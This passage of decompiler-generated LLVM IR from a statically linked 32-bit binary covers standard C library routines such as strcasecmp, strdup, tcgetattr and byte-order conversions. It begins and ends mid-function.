  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  %v0_805dcbc = load i32, i32* @ebp, align 4
  %v0_805dcbd = load i32, i32* @edi, align 4
  %v0_805dcbe = load i32, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_805dcce = icmp ugt i32 %arg1, 124
  br i1 %v6_805dcce, label %dec_label_pc_805dceb, label %dec_label_pc_805dcd0

dec_label_pc_805dcd0:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_806d9a0.660 to i32), i32* @esi, align 4
  %v1_805dce04 = icmp eq i32 %arg1, 0
  %v1_805dce211 = icmp eq i1 %v1_805dce04, false
  br i1 %v1_805dce211, label %dec_label_pc_805dcd9, label %dec_label_pc_805dce4

dec_label_pc_805dcd9:                             ; preds = %dec_label_pc_805dcd0, %dec_label_pc_805dcd9
  %v0_805dcdc = phi i32 [ %v3_805dcdc, %dec_label_pc_805dcd9 ], [ %arg1, %dec_label_pc_805dcd0 ]
  %v0_805dcdf = phi i32 [ %v1_805dcdf, %dec_label_pc_805dcd9 ], [ ptrtoint ([8 x i8]* @global_var_806d9a0.660 to i32), %dec_label_pc_805dcd0 ]
  %v1_805dcd9 = inttoptr i32 %v0_805dcdf to i8*
  %v2_805dcd9 = load i8, i8* %v1_805dcd9, align 1
  %v7_805dcd9 = icmp eq i8 %v2_805dcd9, 0
  %v2_805dcdc = zext i1 %v7_805dcd9 to i32
  %v3_805dcdc = add i32 %v2_805dcdc, %v0_805dcdc
  %v16_805dcdc = icmp eq i32 %v3_805dcdc, 0
  %v1_805dcdf = add i32 %v0_805dcdf, 1
  store i32 %v1_805dcdf, i32* @esi, align 4
  %v1_805dce2 = icmp eq i1 %v16_805dcdc, false
  br i1 %v1_805dce2, label %dec_label_pc_805dcd9, label %dec_label_pc_805dce4

dec_label_pc_805dce4:                             ; preds = %dec_label_pc_805dcd9, %dec_label_pc_805dcd0
  %v0_805dce6 = phi i32 [ ptrtoint ([8 x i8]* @global_var_806d9a0.660 to i32), %dec_label_pc_805dcd0 ], [ %v1_805dcdf, %dec_label_pc_805dcd9 ]
  store i32 0, i32* @ebp, align 4
  %v1_805dce6 = inttoptr i32 %v0_805dce6 to i8*
  %v2_805dce6 = load i8, i8* %v1_805dce6, align 1
  %v3_805dce6 = icmp eq i8 %v2_805dce6, 0
  %v1_805dce9 = icmp eq i1 %v3_805dce6, false
  br i1 %v1_805dce9, label %dec_label_pc_805dce4.dec_label_pc_805dd1a_crit_edge, label %dec_label_pc_805dceb

dec_label_pc_805dce4.dec_label_pc_805dd1a_crit_edge: ; preds = %dec_label_pc_805dce4
  br label %dec_label_pc_805dd1a

dec_label_pc_805dceb:                             ; preds = %dec_label_pc_805dce4, %entry
  %v1_805dcee = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_805dcff = bitcast i32* %stack_var_-17 to i8*
  %v7_805dcff = call i32 @_uintmaxtostr(i8* %v6_805dcff, i32 %arg1, i32 %v1_805dcee, i32 -10, i32 0)
  %v1_805dd0e = add i32 %v7_805dcff, -14
  store i32 %v1_805dd0e, i32* @esi, align 4
  %v5_805dd11 = inttoptr i32 %v1_805dd0e to i8*
  store i8* %v5_805dd11, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_805dd0e to i16*
  %v6_805dd12 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_806d98a.661 to i32), i32 14)
  %v1_805dd24.pre = load i32, i32* @edi, align 4
  %v0_805dd2a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805dd1a

dec_label_pc_805dd1a:                             ; preds = %dec_label_pc_805dce4.dec_label_pc_805dd1a_crit_edge, %dec_label_pc_805dceb
  %v0_805dd2a = phi i32 [ %v0_805dce6, %dec_label_pc_805dce4.dec_label_pc_805dd1a_crit_edge ], [ %v0_805dd2a.pre, %dec_label_pc_805dceb ]
  %v1_805dd24 = phi i32 [ %arg3, %dec_label_pc_805dce4.dec_label_pc_805dd1a_crit_edge ], [ %v1_805dd24.pre, %dec_label_pc_805dceb ]
  %v4_805dd1a = icmp eq i32 %arg2, 0
  %v3_805dd24 = select i1 %v4_805dd1a, i32 0, i32 %v1_805dd24
  store i32 %v3_805dd24, i32* @edi, align 4
  %v5_805dd2a = inttoptr i32 %v0_805dd2a to i8*
  store i8* %v5_805dd2a, i8** %stack_var_-108, align 4
  %v3_805dd2b = call i32 @strlen(i8* %v5_805dd2a)
  %v1_805dd33 = add i32 %v3_805dd2b, 1
  store i32 %v1_805dd33, i32* %ebx.global-to-local, align 4
  %v1_805dd36 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_805dd33, %v1_805dd36
  br i1 %tmp, label %dec_label_pc_805dd3a, label %dec_label_pc_805dd41

dec_label_pc_805dd3a:                             ; preds = %dec_label_pc_805dd1a
  store i32 %v1_805dd36, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_805dd41

dec_label_pc_805dd41:                             ; preds = %dec_label_pc_805dd1a, %dec_label_pc_805dd3a
  %v0_805dd46 = phi i32 [ %v1_805dd33, %dec_label_pc_805dd1a ], [ %v1_805dd36, %dec_label_pc_805dd3a ]
  %v1_805dd41 = icmp eq i32 %v0_805dd46, 0
  br i1 %v1_805dd41, label %dec_label_pc_805dd5d, label %dec_label_pc_805dd45

dec_label_pc_805dd45:                             ; preds = %dec_label_pc_805dd41
  %v0_805dd47 = load i32, i32* @esi, align 4
  %v8_805dd48 = inttoptr i32 %arg2 to i8*
  store i8* %v8_805dd48, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_805dd4c = call i32 @memcpy(i16* %tmp45, i32 %v0_805dd47, i32 %v0_805dd46)
  %v1_805dd58 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805dd58 = add i32 %arg2, -1
  %v3_805dd58 = add i32 %v2_805dd58, %v1_805dd58
  %v4_805dd58 = inttoptr i32 %v3_805dd58 to i8*
  store i8 0, i8* %v4_805dd58, align 1
  br label %dec_label_pc_805dd5d

dec_label_pc_805dd5d:                             ; preds = %dec_label_pc_805dd41, %dec_label_pc_805dd45
  %v0_805dd5d = load i32, i32* @ebp, align 4
  %v1_805dd5d = icmp eq i32 %v0_805dd5d, 0
  br i1 %v1_805dd5d, label %dec_label_pc_805dd68, label %dec_label_pc_805dd61

dec_label_pc_805dd61:                             ; preds = %dec_label_pc_805dd5d
  %v0_805dd61 = load i8*, i8** %stack_var_-108, align 4
  %v1_805dd61 = ptrtoint i8* %v0_805dd61 to i32
  %v2_805dd61 = call i32 @__errno_location(i32 %v1_805dd61)
  %v0_805dd66 = load i32, i32* @ebp, align 4
  %v2_805dd66 = inttoptr i32 %v2_805dd61 to i32*
  store i32 %v0_805dd66, i32* %v2_805dd66, align 4
  %v0_805dd6b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805dd68

dec_label_pc_805dd68:                             ; preds = %dec_label_pc_805dd5d, %dec_label_pc_805dd61
  %v0_805dd6b = phi i32 [ 0, %dec_label_pc_805dd5d ], [ %v0_805dd6b.pre, %dec_label_pc_805dd61 ]
  store i32 %v0_805dcbe, i32* @esi, align 4
  store i32 %v0_805dcbd, i32* @edi, align 4
  store i32 %v0_805dcbc, i32* @ebp, align 4
  ret i32 %v0_805dd6b

; uselistorder directives
  uselistorder i32 %v1_805dd36, { 1, 2, 0 }
  uselistorder i32 %v1_805dd33, { 1, 0, 2 }
  uselistorder i32 %v1_805dcdf, { 0, 2, 1 }
  uselistorder i32 %v3_805dcdc, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_806d9a0.660 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_805dd68, { 1, 0 }
  uselistorder label %dec_label_pc_805dd5d, { 1, 0 }
  uselistorder label %dec_label_pc_805dd41, { 1, 0 }
  uselistorder label %dec_label_pc_805dd1a, { 1, 0 }
  uselistorder label %dec_label_pc_805dcd9, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_805dd84 = inttoptr i32 %arg2 to i8*
  %v3_805dd84 = call i32 @memmove(i8* %v2_805dd84, i32 %arg1)
  ret i32 %v3_805dd84
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805dd8d = load i32, i32* bitcast (i32** @global_var_8075648.662 to i32*), align 8
  %v4_805dd96 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_805dd9e

dec_label_pc_805dd9e:                             ; preds = %dec_label_pc_805ddbb, %entry
  %storemerge = phi i32 [ %v4_805dd96, %entry ], [ %v1_805ddbc, %dec_label_pc_805ddbb ]
  %v0_805ddbc = phi i32 [ %v4_805dd96, %entry ], [ %v1_805ddbc, %dec_label_pc_805ddbb ]
  %v0_805ddc16 = phi i32 [ 0, %entry ], [ %v0_805ddc17, %dec_label_pc_805ddbb ]
  %v0_805ddbb = phi i32 [ %arg2, %entry ], [ %v1_805ddbb, %dec_label_pc_805ddbb ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_805dd9e = icmp eq i32 %v0_805ddbc, %v0_805ddbb
  %.pre = inttoptr i32 %v0_805ddbc to i8*
  br i1 %v12_805dd9e, label %dec_label_pc_805ddb6, label %dec_label_pc_805dda2

dec_label_pc_805dda2:                             ; preds = %dec_label_pc_805dd9e
  %v2_805dda2 = load i8, i8* %.pre, align 1
  %v3_805dda2 = zext i8 %v2_805dda2 to i32
  %v2_805dda5 = mul nuw nsw i32 %v3_805dda2, 2
  %v3_805dda5 = add i32 %v2_805dda5, %v0_805dd8d
  %v4_805dda5 = inttoptr i32 %v3_805dda5 to i16*
  %v5_805dda5 = load i16, i16* %v4_805dda5, align 2
  %v6_805dda5 = sext i16 %v5_805dda5 to i32
  %v1_805dda9 = inttoptr i32 %v0_805ddbb to i8*
  %v2_805dda9 = load i8, i8* %v1_805dda9, align 1
  %v3_805dda9 = zext i8 %v2_805dda9 to i32
  %v2_805ddac = mul nuw nsw i32 %v3_805dda9, 2
  %v3_805ddac = add i32 %v2_805ddac, %v0_805dd8d
  %v4_805ddac = inttoptr i32 %v3_805ddac to i16*
  %v5_805ddac = load i16, i16* %v4_805ddac, align 2
  %v6_805ddac = sext i16 %v5_805ddac to i32
  %v2_805ddb0 = sub nsw i32 %v6_805dda5, %v6_805ddac
  %v12_805ddb0 = icmp eq i32 %v2_805ddb0, 0
  store i32 %v2_805ddb0, i32* @edx, align 4
  %v1_805ddb4 = icmp eq i1 %v12_805ddb0, false
  br i1 %v1_805ddb4, label %dec_label_pc_805ddbf, label %dec_label_pc_805ddb6

dec_label_pc_805ddb6:                             ; preds = %dec_label_pc_805dd9e, %dec_label_pc_805dda2
  %v0_805ddc17 = phi i32 [ %v2_805ddb0, %dec_label_pc_805dda2 ], [ %v0_805ddc16, %dec_label_pc_805dd9e ]
  %v2_805ddb6 = load i8, i8* %.pre, align 1
  %v3_805ddb6 = icmp eq i8 %v2_805ddb6, 0
  br i1 %v3_805ddb6, label %dec_label_pc_805ddbf, label %dec_label_pc_805ddbb

dec_label_pc_805ddbb:                             ; preds = %dec_label_pc_805ddb6
  %v1_805ddbb = add i32 %v0_805ddbb, 1
  %v1_805ddbc = add i32 %v0_805ddbc, 1
  br label %dec_label_pc_805dd9e

dec_label_pc_805ddbf:                             ; preds = %dec_label_pc_805ddb6, %dec_label_pc_805dda2
  %v0_805ddc1 = phi i32 [ %v0_805ddc17, %dec_label_pc_805ddb6 ], [ %v2_805ddb0, %dec_label_pc_805dda2 ]
  ret i32 %v0_805ddc1

; uselistorder directives
  uselistorder i32 %v1_805ddbc, { 1, 0 }
  uselistorder i32 %v0_805ddc17, { 1, 0 }
  uselistorder i32 %v2_805ddb0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805ddbb, { 1, 2, 0 }
  uselistorder i32 %v0_805ddbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805ddb6, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805ddc7 = load i32, i32* @ebx, align 4
  %v4_805ddcb = ptrtoint i8* %arg1 to i32
  %v1_805ddd718 = inttoptr i32 %arg2 to i8*
  %v2_805ddd71932 = load i8, i8* %v1_805ddd718, align 1
  %v4_805ddd92336 = icmp eq i8 %v2_805ddd71932, 0
  %v1_805dddb2538 = icmp eq i1 %v4_805ddd92336, false
  br i1 %v1_805dddb2538, label %dec_label_pc_805dde1.lr.ph.lr.ph, label %dec_label_pc_805de11

dec_label_pc_805dde1.lr.ph.lr.ph:                 ; preds = %entry
  %v3_805ddd72033 = zext i8 %v2_805ddd71932 to i32
  %v4_805ddd7.pre.pre = load i32, i32* @eax, align 4
  %v5_805ddd72134 = and i32 %v4_805ddd7.pre.pre, -256
  %v6_805ddd72235 = or i32 %v3_805ddd72033, %v5_805ddd72134
  %v4_805dde1.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805dde1.lr.ph

dec_label_pc_805dde1.lr.ph:                       ; preds = %dec_label_pc_805dde1.lr.ph.lr.ph, %dec_label_pc_805de0c
  %v4_805dde1.pre = phi i32 [ %v4_805dde1.pre.pre, %dec_label_pc_805dde1.lr.ph.lr.ph ], [ %v0_805ddeb, %dec_label_pc_805de0c ]
  %v6_805ddd72241 = phi i32 [ %v6_805ddd72235, %dec_label_pc_805dde1.lr.ph.lr.ph ], [ %v6_805ddd722, %dec_label_pc_805de0c ]
  %v2_805ddd71940 = phi i8 [ %v2_805ddd71932, %dec_label_pc_805dde1.lr.ph.lr.ph ], [ %v2_805ddd719, %dec_label_pc_805de0c ]
  %v0_805de0c39 = phi i32 [ %v4_805ddcb, %dec_label_pc_805dde1.lr.ph.lr.ph ], [ %v1_805de0c, %dec_label_pc_805de0c ]
  br label %dec_label_pc_805dde1

dec_label_pc_805dde1:                             ; preds = %dec_label_pc_805dde1.lr.ph, %dec_label_pc_805de01
  %v4_805dde1 = phi i32 [ %v4_805dde1.pre, %dec_label_pc_805dde1.lr.ph ], [ %v4_805dde146, %dec_label_pc_805de01 ]
  %v6_805ddd730 = phi i32 [ %v6_805ddd72241, %dec_label_pc_805dde1.lr.ph ], [ %v6_805ddd7, %dec_label_pc_805de01 ]
  %v2_805ddd729 = phi i8 [ %v2_805ddd71940, %dec_label_pc_805dde1.lr.ph ], [ %v2_805ddd7, %dec_label_pc_805de01 ]
  %v1_805ddd728 = phi i8* [ %v1_805ddd718, %dec_label_pc_805dde1.lr.ph ], [ %v1_805ddd7, %dec_label_pc_805de01 ]
  %v0_805de0127 = phi i32 [ %arg2, %dec_label_pc_805dde1.lr.ph ], [ %v1_805de01, %dec_label_pc_805de01 ]
  %v0_805de0226 = phi i32 [ %v0_805de0c39, %dec_label_pc_805dde1.lr.ph ], [ %v1_805de02, %dec_label_pc_805de01 ]
  %v1_805dde1 = inttoptr i32 %v0_805de0226 to i8*
  %v2_805dde1 = load i8, i8* %v1_805dde1, align 1
  %v3_805dde1 = zext i8 %v2_805dde1 to i32
  %v5_805dde1 = and i32 %v4_805dde1, -256
  %v6_805dde1 = or i32 %v5_805dde1, %v3_805dde1
  %v15_805dde3 = icmp eq i8 %v2_805ddd729, %v2_805dde1
  br i1 %v15_805dde3, label %dec_label_pc_805de01, label %dec_label_pc_805ddeb

dec_label_pc_805ddeb:                             ; preds = %dec_label_pc_805dde1
  %v0_805ddeb = load i32, i32* bitcast (i32** @global_var_8075648.662 to i32*), align 8
  %v2_805ddf1 = load i8, i8* %v1_805dde1, align 1
  %v3_805ddf1 = zext i8 %v2_805ddf1 to i32
  %v2_805ddf4 = load i8, i8* %v1_805ddd728, align 1
  %v3_805ddf4 = zext i8 %v2_805ddf4 to i32
  store i32 %v3_805ddf4, i32* @ecx, align 4
  %v2_805ddf7 = mul nuw nsw i32 %v3_805ddf1, 2
  %v3_805ddf7 = add i32 %v2_805ddf7, %v0_805ddeb
  %v4_805ddf7 = inttoptr i32 %v3_805ddf7 to i16*
  %v5_805ddf7 = load i16, i16* %v4_805ddf7, align 2
  %v6_805ddf7 = zext i16 %v5_805ddf7 to i32
  %v4_805ddfb = mul nuw nsw i32 %v3_805ddf4, 2
  %v5_805ddfb = add i32 %v4_805ddfb, %v0_805ddeb
  %v6_805ddfb = inttoptr i32 %v5_805ddfb to i16*
  %v7_805ddfb = load i16, i16* %v6_805ddfb, align 2
  %v18_805ddfb = icmp eq i16 %v5_805ddf7, %v7_805ddfb
  %v1_805ddff = icmp eq i1 %v18_805ddfb, false
  br i1 %v1_805ddff, label %dec_label_pc_805de05, label %dec_label_pc_805de01

dec_label_pc_805de01:                             ; preds = %dec_label_pc_805ddeb, %dec_label_pc_805dde1
  %v4_805dde146 = phi i32 [ %v0_805ddeb, %dec_label_pc_805ddeb ], [ %v6_805dde1, %dec_label_pc_805dde1 ]
  %v4_805ddd76 = phi i32 [ %v6_805ddf7, %dec_label_pc_805ddeb ], [ %v6_805ddd730, %dec_label_pc_805dde1 ]
  %v1_805de01 = add i32 %v0_805de0127, 1
  %v1_805de02 = add i32 %v0_805de0226, 1
  %v1_805ddd7 = inttoptr i32 %v1_805de01 to i8*
  %v2_805ddd7 = load i8, i8* %v1_805ddd7, align 1
  %v3_805ddd7 = zext i8 %v2_805ddd7 to i32
  %v5_805ddd7 = and i32 %v4_805ddd76, -256
  %v6_805ddd7 = or i32 %v3_805ddd7, %v5_805ddd7
  %v4_805ddd9 = icmp eq i8 %v2_805ddd7, 0
  %v1_805dddb = icmp eq i1 %v4_805ddd9, false
  br i1 %v1_805dddb, label %dec_label_pc_805dde1, label %dec_label_pc_805de11

dec_label_pc_805de05:                             ; preds = %dec_label_pc_805ddeb
  %v4_805de05 = icmp eq i8 %v2_805dde1, 0
  br i1 %v4_805de05, label %dec_label_pc_805de0f, label %dec_label_pc_805de0c

dec_label_pc_805de0c:                             ; preds = %dec_label_pc_805de05
  %v1_805de0c = add i32 %v0_805de0c39, 1
  %v2_805ddd719 = load i8, i8* %v1_805ddd718, align 1
  %v3_805ddd720 = zext i8 %v2_805ddd719 to i32
  %v5_805ddd721 = and i32 %v6_805ddf7, 65280
  %v6_805ddd722 = or i32 %v3_805ddd720, %v5_805ddd721
  %v4_805ddd923 = icmp eq i8 %v2_805ddd719, 0
  %v1_805dddb25 = icmp eq i1 %v4_805ddd923, false
  br i1 %v1_805dddb25, label %dec_label_pc_805dde1.lr.ph, label %dec_label_pc_805de11

dec_label_pc_805de0f:                             ; preds = %dec_label_pc_805de05
  br label %dec_label_pc_805de11

dec_label_pc_805de11:                             ; preds = %dec_label_pc_805de0c, %entry, %dec_label_pc_805de01, %dec_label_pc_805de0f
  %storemerge = phi i32 [ 0, %dec_label_pc_805de0f ], [ %v4_805ddcb, %entry ], [ %v1_805de0c, %dec_label_pc_805de0c ], [ %v0_805de0c39, %dec_label_pc_805de01 ]
  store i32 %v0_805ddc7, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805ddd719, { 1, 2, 0 }
  uselistorder i8 %v2_805ddd7, { 1, 2, 0 }
  uselistorder i8* %v1_805ddd7, { 1, 0 }
  uselistorder i32 %v0_805ddeb, { 1, 2, 3, 0 }
  uselistorder i8 %v2_805dde1, { 1, 0, 2 }
  uselistorder i32 %v0_805de0226, { 1, 0 }
  uselistorder i8 %v2_805ddd71932, { 0, 2, 1 }
  uselistorder i8* %v1_805ddd718, { 2, 1, 0 }
  uselistorder i32 65280, { 0, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_805de11, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805dde1, { 1, 0 }
  uselistorder label %dec_label_pc_805dde1.lr.ph, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805de18 = load i32, i32* @edi, align 4
  %v0_805de19 = load i32, i32* @esi, align 4
  %v0_805de1a = load i32, i32* @ebx, align 4
  store i32 %v0_805de1a, i32* %stack_var_-12, align 4
  %v4_805de1b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805de1b, i32* @edi, align 4
  %v3_805de23 = call i32 @strlen(i8* %arg1)
  %v1_805de28 = add i32 %v3_805de23, 1
  store i32 %v1_805de28, i32* @esi, align 4
  %v2_805de2e = call i32 @malloc(i32 %v1_805de28)
  %v1_805de36 = icmp eq i32 %v2_805de2e, 0
  store i32 %v2_805de2e, i32* %ebx.global-to-local, align 4
  br i1 %v1_805de36, label %dec_label_pc_805de48, label %dec_label_pc_805de3c

dec_label_pc_805de3c:                             ; preds = %entry
  %v0_805de3d = load i32, i32* @esi, align 4
  %v0_805de3e = load i32, i32* @edi, align 4
  %tmp12 = inttoptr i32 %v2_805de2e to i16*
  %v6_805de40 = call i32 @memcpy(i16* %tmp12, i32 %v0_805de3e, i32 %v0_805de3d)
  %v0_805de48.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805de48

dec_label_pc_805de48:                             ; preds = %entry, %dec_label_pc_805de3c
  %v0_805de48 = phi i32 [ 0, %entry ], [ %v0_805de48.pre, %dec_label_pc_805de3c ]
  %v2_805de4a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805de4a, i32* @ebx, align 4
  store i32 %v0_805de19, i32* @esi, align 4
  store i32 %v0_805de18, i32* @edi, align 4
  ret i32 %v0_805de48

; uselistorder directives
  uselistorder i32 %v2_805de2e, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805de48, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805de60 = inttoptr i32 %arg1 to i8*
  %v4_805de60 = call i32 @strtok_r(i8* %v3_805de60, i32 %arg2, i32 ptrtoint (i32* @global_var_807dd00.663 to i32))
  ret i32 %v4_805de60
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_805de78 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_805de7d = icmp eq i32 %v3_805de78, 0
  %v1_805de7f = zext i1 %v1_805de7d to i32
  ret i32 %v1_805de7f
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805de9a = call i32 @ioctl(i32 %arg1, i32 21513, i32 1)
  ret i32 %v3_805de9a
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805dea4 = load i32, i32* @esi, align 4
  %v0_805dea5 = load i32, i32* @ebx, align 4
  store i32 %v0_805dea5, i32* %stack_var_-8, align 4
  %v2_805dea9 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805dea9, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_805debb = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_805dea9)
  store i32 %v3_805debb, i32* %eax.global-to-local, align 4
  %v1_805dec3 = icmp eq i32 %v3_805debb, 0
  store i32 %v3_805debb, i32* @esi, align 4
  %v1_805dec7 = icmp eq i1 %v1_805dec3, false
  br i1 %v1_805dec7, label %dec_label_pc_805df0c, label %dec_label_pc_805dec9

dec_label_pc_805dec9:                             ; preds = %entry
  %v3_805dec9 = load i32, i32* %stack_var_-44, align 4
  %v1_805decd = load i32, i32* @ebx, align 4
  %v2_805decd = inttoptr i32 %v1_805decd to i32*
  store i32 %v3_805dec9, i32* %v2_805decd, align 4
  %v1_805ded3 = load i32, i32* @ebx, align 4
  %v2_805ded3 = add i32 %v1_805ded3, 4
  %v3_805ded3 = inttoptr i32 %v2_805ded3 to i32*
  %v1_805deda = load i32, i32* @ebx, align 4
  %v2_805deda = add i32 %v1_805deda, 8
  %v3_805deda = inttoptr i32 %v2_805deda to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_805dee1 = load i32, i32* @ebx, align 4
  %v2_805dee1 = add i32 %v1_805dee1, 12
  %v3_805dee1 = inttoptr i32 %v2_805dee1 to i32*
  store i32 %tmp3, i32* %v3_805dee1, align 4
  %v4_805dee4 = zext i8 %tmp to i32
  %v5_805dee4 = load i32, i32* %eax.global-to-local, align 4
  %v6_805dee4 = and i32 %v5_805dee4, -256
  %v7_805dee4 = or i32 %v6_805dee4, %v4_805dee4
  store i32 %v7_805dee4, i32* %eax.global-to-local, align 4
  %v2_805dee8 = load i32, i32* @ebx, align 4
  %v3_805dee8 = add i32 %v2_805dee8, 16
  %v4_805dee8 = inttoptr i32 %v3_805dee8 to i8*
  store i8 %tmp, i8* %v4_805dee8, align 1
  %v0_805deeb = load i32, i32* %eax.global-to-local, align 4
  %v2_805deee = ptrtoint i32* %stack_var_-27 to i32
  %v0_805def3 = load i32, i32* @ebx, align 4
  %v1_805def3 = add i32 %v0_805def3, 17
  store i32 %v1_805def3, i32* %eax.global-to-local, align 4
  %v4_805def7 = call i32 @__GI_mempcpy(i32 %v1_805def3, i32 %v2_805deee, i32 19, i32 %v0_805deeb)
  store i32 %v4_805def7, i32* %eax.global-to-local, align 4
  %v3_805df04 = inttoptr i32 %v4_805def7 to i8*
  %v4_805df04 = call i32 @__GI_memset(i8* %v3_805df04, i32 0, i32 13)
  store i32 %v4_805df04, i32* %eax.global-to-local, align 4
  %v0_805df0f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805df0c

dec_label_pc_805df0c:                             ; preds = %entry, %dec_label_pc_805dec9
  %v0_805df0f = phi i32 [ %v3_805debb, %entry ], [ %v0_805df0f.pre, %dec_label_pc_805dec9 ]
  store i32 %v0_805df0f, i32* %eax.global-to-local, align 4
  %v2_805df11 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805df11, i32* @ebx, align 4
  store i32 %v0_805dea4, i32* @esi, align 4
  ret i32 %v0_805df0f

; uselistorder directives
  uselistorder i32 %v0_805df0f, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_805df0c, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_805df19 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_805df19 = zext i16 %v3_805df19 to i32
  ret i32 %v4_805df19
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805df25 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_805df25
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_805df2d = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_805df2d = zext i16 %v3_805df2d to i32
  ret i32 %v4_805df2d
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805df39 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_805df39
}

define i32 @gaih_inet_serv(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805df3f = load i32, i32* @edi, align 4
  %v0_805df40 = load i32, i32* @esi, align 4
  store i32 1024, i32* @esi, align 4
  %v0_805df46 = load i32, i32* @ebx, align 4
  store i32 %v0_805df46, i32* %stack_var_-16, align 4
  %v0_805df47 = load i32, i32* @edx, align 4
  store i32 %v0_805df47, i32* @ebx, align 4
  %v15_805df49 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %tmp6, i32* @edi, align 4
  %v0_805df4f = load i32, i32* @eax, align 4
  %v0_805df52 = load i32, i32* @ecx, align 4
  %v2_805df66 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805df6c = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_805df55

dec_label_pc_805df55:                             ; preds = %dec_label_pc_805df90, %entry
  %v0_805df5b = phi i32 [ %v1_805df7c, %dec_label_pc_805df90 ], [ %v15_805df49, %entry ]
  %v0_805df55 = phi i32 [ %v2_805df90, %dec_label_pc_805df90 ], [ 1024, %entry ]
  %v1_805df55 = add i32 %v0_805df55, 30
  %v1_805df58 = and i32 %v1_805df55, -16
  store i32 %v1_805df58, i32* %eax.global-to-local, align 4
  %v2_805df5b = sub i32 %v0_805df5b, %v1_805df58
  %v1_805df5d = add i32 %v2_805df5b, 15
  store i32 %v1_805df5d, i32* %edx.global-to-local, align 4
  %v2_805df61 = add i32 %v2_805df5b, -4
  %v3_805df61 = inttoptr i32 %v2_805df61 to i32*
  store i32 %v1_805df58, i32* %v3_805df61, align 4
  %v0_805df62 = load i32, i32* %edx.global-to-local, align 4
  %v1_805df62 = and i32 %v0_805df62, -16
  store i32 %v1_805df62, i32* %edx.global-to-local, align 4
